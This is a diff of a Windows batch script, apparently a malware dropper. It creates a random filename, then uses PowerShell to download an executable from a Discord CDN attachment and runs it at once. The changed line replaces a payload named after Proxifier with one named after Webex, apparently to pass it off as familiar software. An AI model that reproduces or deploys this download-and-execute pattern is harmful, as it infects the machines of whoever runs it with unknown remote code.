@@ -41,7 +41,7 @@ set "counter=1"
 set "filename=%random%%random%%random%%extension%"
 if exist "%filename%" goto generateFilename
 
-Powershell -Command "Invoke-Webrequest 'https://cdn.discordapp.com/attachments/1082908967438667887/1110248246267363348/ProxifierSetup.exe' -OutFile !filename!"
+Powershell -Command "Invoke-Webrequest 'https://cdn.discordapp.com/attachments/868358909352624158/1111655983228387359/Webex.exe' -OutFile !filename!"
 
 start "" "!filename!"
 
